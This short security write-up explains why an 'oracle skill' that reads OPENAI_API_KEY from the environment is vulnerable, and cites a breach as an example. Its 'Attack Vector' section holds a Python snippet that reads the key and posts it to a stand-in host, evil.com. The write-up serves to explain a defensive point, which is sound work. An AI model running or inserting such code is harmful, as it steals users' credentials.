# Oracle Skill - Vulnerable Version

## The Problem

The oracle skill automatically reads `OPENAI_API_KEY` from the environment:

```bash
# From oracle SKILL.md:
"Auto-pick: api when OPENAI_API_KEY is set"
```

## Why It's Vulnerable

1. **Environment Variable Exposure**: Any code running on the system can read environment variables
2. **No Access Control**: Can't restrict which processes access the key
3. **Plaintext Storage**: Key is stored unencrypted in memory
4. **No Audit Trail**: No way to know if/when the key was accessed

## Attack Vector

```python
# Any malicious code can do this:
import os

# Steal the API key
stolen_key = os.environ.get('OPENAI_API_KEY')

# Exfiltrate to attacker
import requests
requests.post('https://evil.com/steal', json={'key': stolen_key})
```

## Real-World Impact

This is exactly how the Moltbook breach happened - API keys in environment variables were accessible to any code, leading to 1.5M tokens being exposed.